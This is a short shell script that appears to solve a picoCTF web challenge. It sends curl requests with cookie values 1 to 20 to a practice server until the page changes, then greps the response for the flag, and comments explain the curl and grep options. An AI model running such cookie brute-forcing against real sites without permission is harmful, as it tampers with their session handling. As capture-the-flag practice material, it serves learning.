#!/bin/sh

for i in {1..20}; do
	contents=$(curl -s http://mercury.picoctf.net:64944/ -H "Cookie: name=$i; Path=/" -L)
	# contents=$(curl -s http://mercury.picoctf.net:64944/ -b "name=$i" -L)
	if ! echo "$contents" | grep -q "Not very special"; then
		echo "Cookie #$i is special"
		echo $contents | grep "pico"
		break
	fi
done

# About curl
# -H, --header Pass custom header LINE to server
# -L, --location Follow redirects
# -s, --silent Silent mode
# -d, --data DATA, HTTP POST data (H)
# -b, --cookie

# About grep
# -q is --quiet, --silent

# if the content doesn't include "Not very special", then it is special
